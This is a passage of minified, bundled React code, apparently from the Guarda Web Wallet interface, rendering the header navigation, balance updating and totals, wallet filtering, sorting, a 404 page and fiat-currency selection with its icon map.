            const a = (0,
            $.v9)(oe.Yq)
              , n = (0,
            $.v9)(selectedBackupNotify)
              , r = (0,
            $.v9)(oe.Oj);
            return O.createElement("div", {
                className: pk,
                "data-test-name": "header"
            }, O.createElement(NotificationSlot, null), O.createElement(Notifications, null), O.createElement("div", {
                className: "container"
            }, O.createElement("div", {
                className: fk
            }, O.createElement("div", {
                className: yk
            }, O.createElement(Y.OL, {
                to: "/app",
                className: Ek
            }, O.createElement("img", {
                width: "35",
                height: "40",
                src: Fk,
                alt: "Guarda Web Wallet"
            })), a && O.createElement(O.Fragment, null, O.createElement(Y.OL, {
                to: "/app",
                className: Ht()({
                    [bk]: isActiveRootLink()
                }, hk)
            }, "Wallets"), O.createElement(link_internal, {
                to: "/app/buy"
            }, O.createElement(O.Fragment, null, "Buy & Sell")), O.createElement(link_internal, {
                to: "/app/exchange"
            }, O.createElement(O.Fragment, null, "Exchange")), O.createElement(link_internal, {
                to: "/app/earn"
            }, O.createElement(O.Fragment, null, "Earn")), O.createElement("span", {
                onClick: handleBorrowClick,
                id: "borrowClickOnTab"
            }, O.createElement(link_internal, {
                to: "/app/borrow"
            }, "Loan")), O.createElement(link_internal, {
                to: "/app/settings/backup",
                rootURL: "settings"
            }, O.createElement(O.Fragment, null, "Settings", n && O.createElement("span", {
                className: Sk
            })))), !a && O.createElement(O.Fragment, null, O.createElement(link_internal, {
                to: "/app/create"
            }, "Create Wallet"), O.createElement(Y.OL, {
                to: "/app/restore",
                className: Ht()({
                    [bk]: isActiveImportRestore()
                })
            }, "RESTORE OR IMPORT"))), O.createElement("nav", {
                className: Ht()(gk)
            }, a && r && O.createElement("div", null, O.createElement(Y.OL, {
                to: "/app/history"
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: Rk()
                },
                className: Tk
            }))), O.createElement("div", {
                className: Pk
            }, O.createElement("a", {
                href: "https://support.guarda.com",
                target: "_blank",
                rel: "noreferrer noopener"
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: Ok()
                },
                className: Ak
            }))), !(0,
            M.d)() && O.createElement(zk, null), r ? O.createElement("span", {
                className: Ht()(xk),
                onClick: () => e(doLogout()),
                dangerouslySetInnerHTML: {
                    __html: Mk()
                },
                "data-test-name": "logout"
            }) : !(0,
            M.d)() && O.createElement(back_to_guarda, null)))))
        }
        const Yk = "eos-creation-notification_notification_L7V_6"
          , qk = "eos-creation-notification_isCookieBanner_2Q2WC"
          , Xk = "eos-creation-notification_pointer_3JwMi"
          , Qk = "eos-creation-notification_loaderContainer_1VbIL"
          , Jk = "eos-creation-notification_textContainer_208YK";
        function EosCreationNotification() {
            const e = (0,
            $.v9)(notificationIsVisible)
              , t = (0,
            $.v9)(notificationText)
              , a = (0,
            $.v9)(notificationLoader)
              , n = (0,
            $.v9)(tk)
              , r = Ht()(Yk, Xk)
              , l = (0,
            $.I0)()
              , s = Ht()(r, {
                [qk]: !n
            })
              , i = (0,
            O.useContext)(Vt)
              , handleClick = () => {
                i.open("create-eos");
                l(hideNotification())
            }
            ;
            return e && O.createElement("div", {
                className: s,
                hidden: !e,
                onClick: handleClick
            }, a && O.createElement("div", {
                className: Qk
            }, O.createElement(LoaderDots, {
                visible: a
            })), O.createElement("div", {
                className: Jk
            }, t))
        }
        const eS = EosCreationNotification;
        var tS = a(38559);
        function useLocationSearch() {
            const e = (0,
            j.TH)();
            return O.useMemo(( () => Object.fromEntries(new URLSearchParams(e.search).entries())), [e])
        }
        const getLocationParams = () => stringToObject(location.search)
          , aS = a.p + "5867e8d0f1f1fe1f403f507534f847dc.svg"
          , nS = "_404_wrapper_Z5dfN"
          , rS = "_404_text_3XOiz"
          , lS = "_404_oopsTitle_1sHbp"
          , sS = "_404_goBackLink_2KN-y"
          , _404 = () => {
            (0,
            O.useEffect)(( () => {
                ge.b.error(ge.d.NOT_FOUND_404, {
                    url: window.location.href
                })
            }
            ), []);
            return O.createElement("div", {
                className: nS
            }, O.createElement("img", {
                src: aS,
                alt: "Not found",
                width: "600"
            }), O.createElement("p", {
                className: lS
            }, "Oooooops"), O.createElement("p", {
                className: rS
            }, "The page you are looking for doesn’t exist. You can try again or back to Home."), O.createElement(Y.OL, {
                to: (0,
                M.RU)(),
                className: sS
            }, "Go to Main page"))
        }
          , iS = undefined
          , use_default_wallets_filter = () => {
            const e = (0,
            $.v9)(_s)
              , t = (0,
            $.v9)(ws)
              , a = (0,
            $.v9)(bs)
              , n = (0,
            $.v9)(Ss)
              , {convertToFiat: r} = useConverter()
              , {isSpamToken: l, isUnknownToken: s} = useTrashToken()
              , i = undefined
              , o = undefined;
            return {
                defaultWalletsFilter: i => {
                    if (t) {
                        const t = undefined;
                        if (!hiddenModeFilter({
                            item: i,
                            hiddenWallets: e
                        }))
                            return !1
                    }
                    if (l({
                        family: i.family,
                        smartContract: i.smartContract,
                        currency: i.currency
                    }))
                        return !1;
                    if (n && s({
                        family: i.family,
                        smartContract: i.smartContract
                    }))
                        return !1;
                    if (a) {
                        if ("0" === String(i.balance))
                            return !1;
                        if ("0" === r(i.balance, i))
                            return !1
                    }
                    return !0
                }
                ,
                requiredFilter: e => !l({
                    family: e.family,
                    smartContract: e.smartContract,
                    currency: e.currency
                })
            }
        }
          , oS = a.p + "0e04000ebbab2e78fff9d152cb9fb8af.svg"
          , cS = a.p + "ae662c9429c8efa32849de27a175254c.svg"
          , uS = a.p + "346eb353281ee33ce2ce647243ededf7.svg";
        function useClickNewCoinOrToken() {
            const e = (0,
            j.k6)()
              , t = (0,
            $.I0)();
            async function handleClickToken(a, n) {
                var r, l, s, i, o, c;
                a && a.stopPropagation && a.stopPropagation();
                if (!n)
                    return;
                const u = {
                    isNewToken: !0,
                    currency: null !== (r = n.currency) && void 0 !== r ? r : "",
                    family: null !== (l = n.family) && void 0 !== l ? l : "",
                    precision: null !== (s = n.precision) && void 0 !== s ? s : "",
                    balance: "0",
                    title: null !== (i = n.title) && void 0 !== i ? i : "",
                    ticker: null !== (o = n.ticker) && void 0 !== o ? o : "",
                    smartContract: null !== (c = n.smartContract) && void 0 !== c ? c : ""
                };
                t(setActiveWallet({
                    uuid: calculateFakeTokenUuid(n)
                }));
                (0,
                M.p1)() || (0,
                M.tq)() || e.push({
                    pathname: (0,
                    M.RU)("/receive"),
                    search: objectToString(u)
                })
            }
            async function handleClickCoin(a, n) {
                a && a.stopPropagation && a.stopPropagation();
                if (!n)
                    return;
                const r = undefined
                  , l = (new (_e.ZP.getClass({
                    currency: n.currency
                }))).recoverFromPlainObject(n);
                if (l) {
                    t(setActiveWallet({
                        ...l.data,
                        uuid: l.data.title
                    }));
                    (0,
                    M.p1)() || (0,
                    M.tq)() || e.push({
                        pathname: (0,
                        M.RU)("/receive"),
                        search: objectToString({
                            ...l.data,
                            isNewWallet: !0,
                            balance: "0"
                        })
                    })
                }
            }
            return {
                handleClickToken,
                handleClickCoin
            }
        }
        var dS = a(86012);
        const isEmpty = e => "NaN" === e || "" === e || "undefined" === e || "null" === e
          , mS = undefined
          , fiat_estimate_FiatEstimate = e => {
            const {localCurrency: t, localCurrencyIsFiat: a} = local_currency_useLocalCurrency()
              , n = t === e.walletCurrency;
            let r = e.renderCurrency ? ` ${t.toUpperCase()}` : "";
            e.isEChart && n && (r = "USD");
            const currencyItem = e => dS.Y.find((t => t.ticker.toLowerCase() === e.toLowerCase()));
            if (e.withIcon && e.isEChart && n) {
                var l, s;
                r = null !== (l = null === (s = currencyItem(e.selectedFiat || r.toLowerCase())) || void 0 === s ? void 0 : s.icon) && void 0 !== l ? l : r
            } else if (e.withIcon) {
                var i, o, c;
                r = null !== (i = e.selectedFiat ? null === (o = currencyItem(e.selectedFiat)) || void 0 === o ? void 0 : o.icon : null === (c = currencyItem(t)) || void 0 === c ? void 0 : c.icon) && void 0 !== i ? i : r
            }
            if (isEmpty(String(e.value)) || e.resource)
                return e.withIcon ? `${r} —` : `—${r}`;
            let u = null;
            if (e.withIcon && e.isEChart)
                return r + e.value;
            e.full && (u = (0,
            Ko.FH)(e.value, {
                min: 2,
                max: 18
            }));
            a && (u = (0,
            Ko.FH)(e.value, {
                min: 2,
                max: 2
            }));
            a && e.isRate && (u = (0,
            Ko.SJ)(e.value, a));
            u || (u = (0,
            Ko.FH)(e.value, {
                min: 2,
                max: 5
            }));
            return isEmpty(u) ? e.withIcon ? `${r}—` : `-${r}` : e.isRate && 0 === parseFloat(u) && Number(e.value) > 0 ? e.withIcon ? `< ${r}0.0001` : `< 0.0001 ${r}` : 0 === parseFloat(u) && Number(e.value) > 0 && !e.isEChart ? e.withIcon ? `< ${r}0.01` : `< 0.01 ${r}` : e.dashBoard && u && (0,
            Ko.gt)(u.length, 13) ? (0,
            Ko.i1)(u, void 0, r) : e.withIcon ? r + (0,
            Ko.i1)(u) : Number.isInteger(+u) ? `${(0,
            Ko.i1)(u, 2)}.00${r}` : (0,
            Ko.i1)(u) + r
        }
          , pS = a.p + "1d076065cb1b9ae0ba456f269c4ac392.svg"
          , fS = a.p + "18e2fed94d23979b42510bccb90e6302.svg"
          , ES = a.p + "c7bfad04ac512b27bb8aef37f3810f79.svg"
          , hS = "update-balance_update_3UoBL"
          , gS = "update-balance_updateIcon_1fB_9"
          , yS = "update-balance_updateTxt_2M8Vd"
          , vS = "update-balance_updateIconLoading_GZmWm"
          , _S = "update-balance_rotate_2lbo6";
        let wS;
        !function(e) {
            e.DEFAULT = "DEFAULT";
            e.LOADING = "LOADING";
            e.SUCCESSFUL = "SUCCESSFUL";
            e.UNSUCCESSFUL = "UNSUCCESSFUL"
        }(wS || (wS = {}));
        const UpdateBalance = e => {
            let {wallet: t, all: a, immediately: n} = e;
            const r = (0,
            $.I0)()
              , l = (0,
            $.v9)(Bo)
              , s = (0,
            $.v9)(Ac.bq)
              , [i,o] = (0,
            O.useState)(wS.DEFAULT);
            (0,
            O.useEffect)(( () => {
                !0 === l ? o(wS.LOADING) : !1 === l && i === wS.LOADING && a && o(wS.SUCCESSFUL)
            }
            ), [l]);
            const c = (0,
            O.useRef)(null);
            (0,
            O.useEffect)(( () => {
                i === wS.SUCCESSFUL && (c.current = setTimeout(( () => {
                    o(wS.DEFAULT)
                }
                ), 1500))
            }
            ), [i]);
            const update = async () => {
                if (a)
                    await r(dt());
                else if (t) {
                    o(wS.LOADING);
                    await r(updateWalletsBalanceAndTxs(t, {
                        isCascade: !0
                    }))
                }
            }
              , u = (0,
            O.useMemo)(( () => {
                var e;
                return null != t && t.uuid && null !== (e = s[t.uuid]) && void 0 !== e && e.balance ? s[t.uuid].balance : null
            }
            ), [null == t ? void 0 : t.uuid, s]);
            (0,
            O.useEffect)(( () => {
                l || null === u || (u.apiStatus === Ac.rA.Resolved ? o(wS.SUCCESSFUL) : u.apiStatus === Ac.rA.Rejected && o(wS.UNSUCCESSFUL))
            }
            ), [u, l, s]);
            (0,
            O.useEffect)(( () => {
                if (!0 === n && !1 === l) {
                    clearTimeout(c.current);
                    o(wS.DEFAULT);
                    update()
                }
            }
            ), [n, t]);
            const handleUpdateBalance = async () => {
                update()
            }
            ;
            return O.createElement("div", {
                className: hS
            }, i === wS.DEFAULT && O.createElement(O.Fragment, null, O.createElement("img", {
                src: pS,
                className: gS,
                alt: "Update",
                onClick: handleUpdateBalance
            })), i === wS.LOADING && O.createElement(O.Fragment, null, O.createElement("img", {
                src: fS,
                className: Ht()(gS, vS),
                alt: "Loading"
            })), i === wS.SUCCESSFUL && O.createElement(O.Fragment, null, O.createElement("img", {
                src: ES,
                className: gS,
                alt: "Done"
            }), O.createElement("div", {
                className: yS
            }, "Updated")), i === wS.UNSUCCESSFUL && O.createElement(O.Fragment, null, O.createElement("img", {
                src: pS,
                className: gS,
                alt: "Update",
                onClick: handleUpdateBalance
            }), O.createElement("div", {
                className: yS
            }, "Oops! Try again")))
        }
          , bS = ee.P.create({
            name: "total-balance"
        })
          , summWallet = (e, t, a, n) => {
            const r = (0,
            Cd.w)(t, e);
            if (!r)
                return "0";
            if (Number.isNaN(parseFloat(String(Number(e.balance)))) || "" === e.balance) {
                bS.error(`Failed calculate balance by wallet: ${e.currency} ${e.balance}`);
                return "0"
            }
            if (!r.rates[a]) {
                const t = undefined
                  , l = n(getWalletBalanceUSD(e.balance, r.rates.usd), a);
                return l || "0"
            }
            return (0,
            Ko.FH)((0,
            Ko.$q)(e.balance, String(r.rates[a])), {
                max: 18
            })
        }
          , total_balance = () => {
            const {localCurrency: e} = local_currency_useLocalCurrency()
              , t = (0,
            $.v9)(kd.Y2)
              , {convertFiatToUSD: a} = fiat_converter()
              , n = (0,
            O.useCallback)((n => {
                try {
                    let r = "0";
                    n.forEach((n => {
                        r = (0,
                        Ko.PD)(r, summWallet(n, t, e, a)).toString();
                        n.subWallets && n.subWallets.length > 0 && (!n.type || n.type !== we.uQ.BTC_LIKE_SEGWIT_WALLET) && n.subWallets.forEach((n => {
                            r = (0,
                            Ko.PD)(r, summWallet(n, t, e, a)).toString()
                        }
                        ))
                    }
                    ));
                    return r
                } catch (e) {
                    console.warn(e);
                    return "..."
                }
            }
            ), [t, e, a]);
            return [n, e]
        }
          , kS = a.p + "0d557fae607e4b2dd1e61bdf4f6f5900.svg"
          , SS = a.p + "16ddb44d42c709f9f32698a7d615a276.svg"
          , CS = "sort-by_wrapper_28LTC"
          , NS = "sort-by_iconWrapper_361cJ"
          , TS = "sort-by_icon_2msPi"
          , AS = "sort-by_defaultWrapper_2eJji"
          , xS = "sort-by_wrapperForClick_3ZTMg"
          , IS = "sort-by_value_1m5OT"
          , PS = "sort-by_filterWrapper_3suUw"
          , LS = "sort-by_filterHeader_2C1YZ"
          , FS = "sort-by_listSortTypes_1kBYG"
          , WS = "sort-by_isActive_2tEnG"
          , RS = "sort-by_checkWrapper_10oS9"
          , BS = "sort-by_textWrapper_J9OVb"
          , OS = "sort-by_iconArrow_1HRTe"
          , DS = "sort-by_fiatType_22Nc0";
        function SortByDashboard(e) {
            let {withIcon: t} = e;
            const a = (0,
            $.v9)(selectedCache)
              , [n,r] = (0,
            O.useState)(!1)
              , l = (0,
            $.I0)()
              , s = a.dashboardSortBy || gd
              , i = [{
                title: "Currency",
                type: Ed
            }, {
                title: "Estimates",
                type: fd
            }, {
                title: "Rating",
                type: hd
            }];
            function handleChange(e) {
                return function change() {
                    r(!1);
                    l(setCacheKey("dashboardSortBy", e))
                }
            }
            const o = i.find((e => e.type === s)) || i[0];
            return O.createElement("div", {
                className: t ? CS : AS
            }, t ? O.createElement("div", {
                className: NS,
                onClick: () => r(!0)
            }, O.createElement("img", {
                src: kS,
                className: TS,
                alt: "Filter"
            })) : O.createElement("div", {
                className: BS,
                onClick: () => r(!0)
            }, "Sort by: ", O.createElement("span", null, o.title), O.createElement("img", {
                src: SS,
                className: OS,
                alt: "Srt by"
            })), O.createElement(Xl(), {
                visible: n,
                onClose: () => r(!1)
            }, O.createElement("div", {
                className: Ht()(PS)
            }, O.createElement("div", {
                className: LS
            }, "Sort by"), O.createElement("ul", {
                className: FS
            }, i.map((e => O.createElement("li", {
                key: `fiat-${e.type}`,
                onClick: handleChange(e.type),
                className: Ht()({
                    [WS]: s === e.type
                })
            }, O.createElement("span", {
                className: RS
            }, s === e.type && O.createElement("img", {
                src: uf,
                alt: "Check"
            })), e.title)))))))
        }
        var MS = a(14439)
          , US = a.n(MS);
        const GS = "fiat-toggle_fiatType__AtNh"
          , VS = "fiat-toggle_listWrapper_3ys88"
          , KS = "fiat-toggle_wrapperFiatToggle_Iriet"
          , HS = "fiat-toggle_isActive_28NGS"
          , zS = "fiat-toggle_iconArrow_1XytF"
          , jS = "fiat-toggle_listFiatCurrencies_21_7v"
          , $S = a.p + "d21891dee6ad59e10ff37115722a20fd.svg"
          , ZS = a.p + "557f123656b002fa22f84e74b1392cd6.svg"
          , YS = a.p + "87bac1d744e86f8c30d5ed2e111fbe16.svg"
          , qS = a.p + "1ee3ae770271b116ec2137664ee492e6.svg"
          , XS = a.p + "11c8da7bbf5361240d5acb0f1c991baa.svg"
          , QS = a.p + "38ea3f1af6038c592fe0474e159500ca.svg"
          , JS = a.p + "c0be78e054fb2bd470d66cc1313252fc.svg"
          , eC = a.p + "ce7d11a86f63e2f8d7ae4d5e9cfd8b07.svg"
          , tC = a.p + "206144166f8f515f5a407b2e9734bb47.svg"
          , aC = a.p + "d63a9079da1aa6ed049f2f1c2d74e956.svg"
          , nC = a.p + "9cbd0aed2d3763a3ff64e06d264594e9.svg"
          , rC = a.p + "b070a81c49c2025a90cc91493a295cbe.svg"
          , lC = a.p + "eb93b003afd07b177651a8f393c975ad.svg"
          , sC = a.p + "2e4d2a62fcb3e6517db871ace9d65949.svg"
          , iC = a.p + "939f405bf1d20999d90f850f530ab56a.svg"
          , oC = a.p + "2fbf9fb694b98cf9e9dab57926736360.svg"
          , cC = a.p + "607ff73905facd2ec7e065f060c22db2.svg"
          , uC = a.p + "83878f770cdf81c4f838ca6e7638e58d.svg"
          , dC = a.p + "01a2a5ab6d04241bb5b9a07e68136f6f.svg"
          , mC = a.p + "719151b2050ebbec1a51aaed24e27b44.svg"
          , pC = a.p + "195f88e7e9a2011c65ee9ef9bb73426b.svg"
          , fC = a.p + "5552d2dddbeb262b7a1bdc2fbc97aced.svg"
          , EC = a.p + "c4e917ac3b41816e63090ca42e3c2960.svg"
          , hC = a.p + "04701613119f30e2b1cb6bc49da8a23c.svg"
          , gC = a.p + "eab43cb1a614e74fc5ab8ad806c49f53.svg"
          , yC = a.p + "eb916cbe13d37aeb4b073056fb31de1a.svg"
          , vC = a.p + "801b9af85e9aaf787364c4d38f81c54a.svg"
          , _C = a.p + "e2802a8a5b2c1756bd5dc035891c5ead.svg"
          , wC = a.p + "db81791fc72cc377c523a8f3b41d08d9.svg"
          , bC = a.p + "28e0a49849ab1718ab4ac270261edcf2.svg"
          , kC = a.p + "0399e2c1e2fd5562f2e1fc60b9e5bb1f.svg"
          , SC = a.p + "d41d483a395669271b4061cf7b4d81ec.svg"
          , CC = a.p + "535ca2a5cef36e46eaae619b19c9a37c.svg"
          , NC = a.p + "bbe62307d17a8ef899022445f12be8e8.svg"
          , TC = a.p + "88fd8b847303767e1d8430bb952dfb6d.svg"
          , AC = a.p + "4d214fde565153530ee3b73a5ced13ef.svg"
          , xC = a.p + "da4881c0de98207ad9a6cbc16a9bf49e.svg"
          , IC = a.p + "a37d42b7dbb1118d8c64f803d28ce7df.svg"
          , PC = a.p + "85d35c3e710af22cec0d82316aa02154.svg"
          , LC = a.p + "b066dcb58448265cb5b3258e0a1cdd1c.svg"
          , FC = a.p + "e5557ea6f58fa66aedd050e354249650.svg"
          , WC = a.p + "e23747117381495b6599efa341dc993c.svg"
          , RC = a.p + "488bc6cd57cc327cfba9f7a8b21302b0.svg"
          , BC = a.p + "dba3c80cceed1062c74bcbad683f32e9.svg"
          , OC = a.p + "490429cd9bfcb3a085c2d0d2e5d570be.svg"
          , DC = a.p + "c6fe5d489ab70205b393bf7995fb8faa.svg"
          , MC = a.p + "5fb13b80ec5005e44e80f5fd50656777.svg"
          , UC = a.p + "eb8f0e1f9fe8930a6df69f70edf60d16.svg"
          , GC = a.p + "b56a9ead81729eb29bae68d73ecaeef7.svg"
          , VC = a.p + "f9eaa544c58184aa603e721277bdffd8.svg"
          , KC = a.p + "e4440f5a119d9fb545e98f96782a4467.svg"
          , HC = a.p + "ccfc32342708a92ac767d38fa630fbbb.svg"
          , zC = a.p + "96a1159241af2e40e8cf3254ea199acf.svg"
          , jC = a.p + "0ab0688acf7e736d0b567b086cceacca.svg"
          , $C = a.p + "6c636a541dc5c0a2d8133ef8de263db0.svg"
          , ZC = a.p + "809b9ed5ec7afb0e46692b689ddda450.svg"
          , YC = a.p + "1dd8150092a817a06c51ef595adf7859.svg"
          , qC = a.p + "d09897e69dd54de3ca5634898d886395.svg"
          , XC = a.p + "211f9c3c4cbe1bbc90654df83a30117b.svg"
          , QC = a.p + "b8245e14b935fa8f51c4b565fbb4fcb9.svg"
          , JC = a.p + "bd23fa7a0a290079d20b85ccd0c5a5d9.svg"
          , eN = a.p + "052e6316b42a52e850ec0a2927bc8cc6.svg"
          , tN = a.p + "01cc9fe55ee3b99b8bac525b5f247e44.svg"
          , aN = a.p + "050f18870352ee8fd2d691d9ed22f97e.svg"
          , nN = a.p + "2641e538a4a39eceaee2153055d50f6f.svg"
          , rN = a.p + "7deb189782cd1208c70795c370a534ce.svg"
          , lN = a.p + "82f13c9ed244d7b8315b63ee6996d98c.svg"
          , sN = a.p + "da8234acd58a26f86b0d67406e356c63.svg"
          , iN = a.p + "b0aec1077d81e90e9656a2778aca5e7a.svg"
          , oN = a.p + "b3e15d0030571bdf1db428354f6495ea.svg"
          , cN = a.p + "5ea342c3b9a77fbc97708d55ceba7938.svg"
          , uN = a.p + "ed477ee87bd45365f409143a2517f147.svg"
          , dN = a.p + "7e4030fd91b3aec8ec30d7f312558931.svg"
          , mN = a.p + "efe351f2b1ed2136648d2f5e7845efd7.svg"
          , pN = a.p + "286d3a1c6cceac5a96ae60eb4f90fd23.svg"
          , fN = a.p + "eb65c7cbee4666268c93340e098c928c.svg"
          , EN = a.p + "9e8357cc243c5636217a561daf69408e.svg"
          , hN = a.p + "ee9c2e9ffd26d051fc5fdd917b8aed10.svg"
          , gN = a.p + "25d52d151ee9028abb4ace48e96870c8.svg"
          , yN = a.p + "a45a32f11022224f2175d124a062d1bb.svg"
          , vN = a.p + "b57a78fed9f03b48453f218f1f7ebe3a.svg"
          , _N = a.p + "ccbe31fd9db13b018ea3dc8f95c53142.svg"
          , wN = a.p + "fdc778e5169e669d4d71027bc92097fd.svg"
          , bN = a.p + "96ad51aeb96a542fb7c473d42d1afe4a.svg"
          , kN = a.p + "a7c7112b6253fcdcff3d7e46210d3c67.svg"
          , SN = a.p + "f2e8b5c86f68553e950d6f854dc4b157.svg"
          , CN = a.p + "7f8bd5af293231f1f86049f4a7a85272.svg"
          , NN = a.p + "cc5f509be59e4d23442f8c75a8d44c97.svg"
          , TN = a.p + "4e840f60d3d3301383f0e1804af2f455.svg"
          , AN = a.p + "d45045b5517d280b3de471dc3b26bf36.svg"
          , xN = a.p + "d6dd67e99c05a6ad0bed0dd11b772bb9.svg"
          , IN = a.p + "b6ce83d737c3650562326fda359f410f.svg"
          , PN = a.p + "26af4167208d5a0cd0df14041329bf77.svg"
          , LN = a.p + "eb8a2c12a5344ebf15365108558a6ae0.svg"
          , FN = a.p + "df5382d0d75fada5a1ba06fb35671e1a.svg"
          , WN = a.p + "fcb98e2e3de0faaca176fbbc333b9705.svg"
          , RN = a.p + "5c45d72050404891ee2ae5a1d1292711.svg"
          , BN = a.p + "7fd59047bd392d26e46896c7be18ea4d.svg"
          , ON = "icon-fiat_iconWrapper_1fFrl"
          , DN = "icon-fiat_icon_Wdb5S"
          , MN = {
            usd: $S,
            eur: ZS,
            btc: YS,
            eth: qS,
            aed: XS,
            aud: QS,
            bgn: JS,
            brl: eC,
            cad: tC,
            chf: aC,
            cny: nC,
            czk: rC,
            dkk: lC,
            gbp: sC,
            hkd: iC,
            hrk: oC,
            huf: cC,
            ils: dC,
            inr: mC,
            isk: pC,
            jpy: fC,
            krw: EC,
            mad: hC,
            mxn: gC,
            myr: yC,
            nok: vC,
            ngn: _C,
            nzd: wC,
            php: bC,
            pkr: kC,
            pln: SC,
            ron: CC,
            rub: NC,
            sek: TC,
            sgd: AC,
            twd: xC,
            thb: IC,
            turkishTry: PC,
            uah: LC,
            zar: FC,
            ars: WC,
            azn: RC,
            clp: BC,
            cop: OC,
            crc: DC,
            dop: MC,
            gel: UC,
            idr: uC,
            kzt: GC,
            mdl: VC,
            nad: KC,
            pen: HC,
            uyu: zC,
            qar: jC,
            sar: $C,
            uzs: ZC,
            vnd: YC,
            gtq: qC,
            xaf: XC,
            ang: QC,
            kwd: JC,
            zmw: eN,
            omr: tN,
            kes: aN,
            bnd: nN,
            rsd: rN,
            mzn: lN,
            bob: sN,
            egp: iN,
            bhd: oN,
            bwp: cN,
            all: uN,
            amd: dN,
            bam: mN,
            bbd: pN,
            bdt: fN,
            bmd: EN,
            byn: hN,
            djf: gN,
            ghs: yN,
            hnl: vN,
            jmd: _N,
            kgs: wN,
            khr: bN,
            kyd: kN,
            lbp: SN,
            lkr: CN,
            mkd: NN,
            mnt: TN,
            mop: AN,
            mur: xN,
            pab: IN,
            pgk: PN,
            pyg: LN,
            sos: FN,
            ttd: WN,
            tzs: RN,
            ugx: BN
        };
        function FiatIcon(e) {
            function getIcon(t) {
                return "try" === t.toLowerCase() ? O.createElement("img", {
                    src: PC,
                    className: DN,
                    alt: "TRY"
                }) : O.createElement("img", {
                    src: MN[t.toLowerCase()],
                    className: Ht()(DN, e.className),
                    alt: t.toUpperCase()
                })
            }
            return O.createElement("div", {
                className: ON
            }, getIcon(e.currencyTicker))
        }
        FiatIcon.propTypes = {
            currencyTicker: as().string,
            className: as().any
        };
        const UN = FiatIcon
          , GN = "fiat-list_fiatCurrency_2_gVc"
          , VN = "fiat-list_fiatLeftSide_3JsIK"
          , KN = "fiat-list_iconArrowSelect_g8f47"
          , HN = "fiat-list_fiatTitle_3QT_G"
          , zN = "fiat-list_list_sAASM"
          , jN = "fiat-list_fiatSubTitle_3OG0O"
          , $N = "fiat-list_searchWrapper_d-PAN"
          , ZN = "fiat-list_searchInput_uFA-L"
          , YN = "fiat-list_newScrollBar_5oPFs"
          , qN = "fiat-list_fiatIcon_2pOCJ"
          , XN = "fiat-list_fiatCurrencyTitle_24WJn"
          , QN = "fiat-list_isActive_2uwe3"
          , JN = "fiat-list_SearchIcon_1yveg"
          , eT = "fiat-list_emptyState_1IB6s"
          , tT = "fiat-list_icon_2_9pl change-password_icon_2B12u"
          , aT = "fiat-list_clearPassIcon_2HYi6 change-password_clearPassIcon_SWaqm"
          , nT = O.forwardRef(( (e, t) => {
            const {search: a, filteredList: n, handleSelect: r, handleSearch: l, verticalPosition: s, horizontalPosition: i, className: o, selectedFiat: c} = e
              , u = {
                ...s,
                ...i
            }
              , enterHandler = e => {
                e.dataset.fiatTicker && r(e.dataset.fiatTicker)()
            }
              , {arrowNavigation: d, listRef: m} = es({
                enterHandler
            });
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: Ht()(zN, o && o),
                ref: t,
                style: {
                    ...u,
                    position: "fixed",
                    top: "50px",
                    left: "50%",
                    transform: "translateX(-50%)"
                }
            }, O.createElement("span", {
                className: $N,
                onKeyDown: d
            }, O.createElement("input", {
                onChange: l,
                autoFocus: !0,
                placeholder: "Search for quote currency",
                type: "text",
                className: ZN,
                spellCheck: "false",
                autoCorrect: "off",
                autoComplete: "off",
                value: a
            }), a && O.createElement("span", {
                onClick: () => l({
                    target: {
                        value: ""
                    }
                }),
                className: Ht()(tT, aT)
            })), O.createElement("ul", {
                className: YN,
                ref: m
            }, n && (null == n ? void 0 : n.filter((e => null == e ? void 0 : e.ticker)).map((e => O.createElement("li", {
                className: c === e.ticker ? QN : "",
                key: `fiat-list${null == e ? void 0 : e.ticker}`,
                onClick: r(e.ticker),
                "data-fiat-ticker": e.ticker
            }, O.createElement(UN, {
                className: qN,
                currencyTicker: e.ticker
            }), O.createElement("div", {
                className: XN
            }, e.title, " ", O.createElement("br", null), O.createElement("span", null, (0,
            be.xG)(e.ticker))))))), n && !n.length && O.createElement("div", {
                className: eT
            }, O.createElement("p", null, 'No results found for "', a, '"')))))
        }
        ))
          , rT = nT;
        var lT = a(4406);
        const FiatToggle = () => {
            const [e,t] = (0,
            O.useState)(!1)
              , {localCurrency: a, changeLocal: n} = local_currency_useLocalCurrency()
              , [r,l] = (0,
            O.useState)(lT.W)
              , [s,i] = (0,
            O.useState)("");
            (0,
            O.useEffect)(( () => {
                if (!e) {
                    i("");
                    l(lT.W)
                }
            }
            ), [e]);
            const handleChange = e => () => {
                t(!1);
                n(e)
            }
              , handleSearch = e => {
                let {target: t} = e;
                i(t.value);
                l(( () => lT.W.filter((e => e.title.toLowerCase().includes(t.value.toLowerCase()) || e.ticker.toLowerCase().includes(t.value.toLowerCase())))))
            }
            ;
            return O.createElement("div", {
                className: KS
            }, O.createElement("div", {
                className: GS,
                onClick: () => t(!0)
            }, (0,
            be.xG)(a), O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: US()
                },
                className: zS
            })), O.createElement(Xl(), {
                visible: e,
                onClose: () => t(!1)
            }, O.createElement(rT, {
                className: VS,
                verticalPosition: {
                    top: (0,
                    M.d)() ? 60 : 30
                },
                horizontalPosition: {
                    left: 0
                },
                filteredList: r,
                handleSelect: handleChange,
                handleSearch,
                search: s
            })))
        }
          , sT = FiatToggle
          , iT = "dashboard-wallets_wrapper_2sZpO app_wrapperBlock_2EpA3"
          , oT = "dashboard-wallets_boardWrapper_NOWkG"
          , cT = "dashboard-wallets_wrapperText_13ung"
          , uT = "dashboard-wallets_wrapperAddWallets_3y8lG"
          , dT = "dashboard-wallets_walletList_QzXxu"
          , mT = "dashboard-wallets_fioEmptyImage_1C37b"
          , pT = "dashboard-wallets_emptyState_34xfU"
          , fT = "dashboard-wallets_addButton_1TRYp"
          , ET = "dashboard-wallets_searchBlock_IOBky"
          , hT = "dashboard-wallets_plus_3Sj3u"
          , gT = "dashboard-wallets_relative_12lCx"
          , yT = "dashboard-wallets_counterWrapper_356QW"
          , vT = "dashboard-wallets_counter_3Udav"
          , _T = "dashboard-wallets_headerWrapper_35cyo"
          , wT = "dashboard-wallets_searchWrapper_5Fks8"
          , bT = "dashboard-wallets_cancel_653In"
          , kT = "dashboard-wallets_glassIcon_1Izs6"
          , ST = "dashboard-wallets_allHiddenWrap_1sN2O"
          , CT = "dashboard-wallets_allHiddenImage_Zve20"
